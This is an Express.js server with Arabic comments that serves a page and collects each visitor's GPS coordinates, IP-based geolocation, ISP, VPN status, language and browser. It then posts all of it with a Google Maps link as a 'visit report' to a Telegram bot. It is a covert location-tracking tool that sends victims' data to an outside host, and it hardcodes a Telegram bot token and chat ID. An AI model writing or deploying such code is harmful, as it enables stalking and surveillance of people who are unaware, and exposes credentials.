const express = require("express");
const path = require("path");

const app = express();
app.use(express.json());

// ====== الإعدادات (هام: قم بتغيير التوكن إذا تم كشفه) ======
const TELEGRAM_BOT_TOKEN = "8099317271:AAGndvsVqk9qNnzitfLhqp8UenEzlxxBA8Y";
const TELEGRAM_CHAT_ID = "8059402181";
const PORT = process.env.PORT || 3000;

// ====== إرسال التقرير لتليجرام ======
async function sendToTelegram(text) {
  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: text,
        parse_mode: "Markdown"
      }),
    });
  } catch (err) {
    console.error("Telegram Error:", err);
  }
}

// ====== معالجة الزيارة ======
app.post("/visit", async (req, res) => {
  try {
    const { lat, lon, accuracy, userAgent, language } = req.body;
    const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress;

    // الحصول على بيانات الـ IP التقليدية (للمقارنة أو في حال رفض الإذن)
    const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=66846719`);
    const ipGeo = await geoRes.json();

    const locationSource = lat ? "🎯 GPS (دقيق جداً)" : "🌐 IP Address (تقديري)";
    const mapsLink = lat ? `https://www.google.com/maps?q=${lat},${lon}` : "غير متوفر";

    const message = `
🔔 *تقرير زيارة جديد*
----------------------
📍 *مصدر الموقع:* ${locationSource}
📌 *الإحداثيات:* ${lat || "N/A"}, ${lon || "N/A"}
📏 *نسبة الخطأ:* ${accuracy ? accuracy + " متر" : "N/A"}

🌍 *بيانات الـ IP (الشبكة):*
- المدينة/المحافظة: ${ipGeo.city || "غير معروف"}
- الدولة: ${ipGeo.country || "غير معروف"}
- الشركة المزودة: ${ipGeo.isp || "غير معروف"}
- هل يستخدم VPN؟: ${ipGeo.proxy ? "نعم ⚠️" : "لا"}

📱 *الجهاز والمتصفح:*
- اللغة: ${language}
- المتصفح: ${userAgent.substring(0, 50)}...

🗺️ *رابط الموقع على الخريطة:*
${mapsLink}

⏰ *الوقت:* ${new Date().toLocaleString('ar-EG')}
----------------------
`;

    await sendToTelegram(message);
    res.json({ success: true });
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: "internal error" });
  }
});

// تقديم الصفحة الرئيسية
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
